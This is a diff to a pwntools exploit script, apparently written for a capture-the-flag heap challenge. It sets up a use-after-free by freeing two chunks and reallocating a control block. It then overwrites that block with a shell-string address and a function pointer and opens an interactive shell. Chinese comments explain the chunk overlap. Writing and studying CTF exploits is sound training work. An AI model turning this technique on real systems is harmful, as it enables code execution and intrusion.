@@ -29,7 +29,7 @@ def insert(size, data):
 def output(idx):
     io.sendlineafter(b"Your choice :", "3")
     io.sendlineafter(b":", str(idx))
-    return io.recvuntil(b"  welcome to magic room", drop=True)
+    return io.recvuntil(b"  welcome to magic room", drop=True, timeout=3)
 
 def remove(idx):
     io.sendlineafter(b"Your choice :", "2")
@@ -40,7 +40,6 @@ insert(0x100, b"whatever")  # 0re
 insert(0x100, b"whatever")  # 1st
 remove(1)
 remove(0)
-insert(0x10, p64(binsh_addr) + p64(func_black_magic_addr))  # 此时 2rd数据块 就是 1st控制块。前8字节只要是个合法地址就行。
-io.sendlineafter(b"Your choice :", b"3")
-io.sendlineafter(b":", b"1")
+insert(0x10, p64(binsh_addr) + p64(func_black_magic_addr))  # 2nd //此时 2nd数据块 就是 1st控制块。前8字节只要是个合法地址就行。
+output(1)
 io.interactive()
